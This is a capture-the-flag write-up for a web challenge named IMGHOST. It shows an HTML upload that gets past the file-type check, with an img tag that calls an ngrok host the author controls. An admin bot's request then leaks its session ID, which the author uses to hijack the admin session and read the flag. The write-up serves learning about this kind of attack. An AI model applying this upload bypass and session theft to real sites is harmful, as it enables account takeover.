# IMGHOST

Points: 100

I wasn't able to solve this in time, so this write-up is based on the solution
from the author.

At first glance, this looks like an XSS challenge. However, the weird thing is
the `object` tag.

If we try to send JS in a fake PNG, it doesn't execute, which was where I got
stuck.

But it turns out that you can change the file type from the selector.
Using this payload in `inj.htm` and modifying the request to use a filetype of
`htm`, it loaded successfully in the `object` tag.
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width" />
        <title>Hello</title>
    </head>
    <body>
        <h1>Hello</h1>
        <img src="http://6f97f1b2d483.ngrok.io/idiot.png"/>
    </body>
</html>
```

After clicking `Report Abuse`, the admin bot accessed this page. I got this
request:
```
http://web/uploads/kUtKCFpFlfcYV4ZMZqXP.htm?
  lang=en&
  ref=website&
  pd=673e4a8d240d0ba0a0cdb3db6ec8af65&
  u=5f9f0cce4332e&
  client=pybu3zheoyeupyzgodcrxf7oqc& <- this is set to the phpsessid!
  method=direct&
  t=1604259022
```

After setting my `phpsessid` cookie to `pybu3zheoyeupyzgodcrxf7oqc` and
navigating to the home page, I was able to see a file called `flag.txt`.

This gave me:
```
CSR{N1C3_4ND-E4ZY-W4snT-1T?-:)}
```

---

Note:
The source code `file.php` can be downloaded, but I didn't realize this.
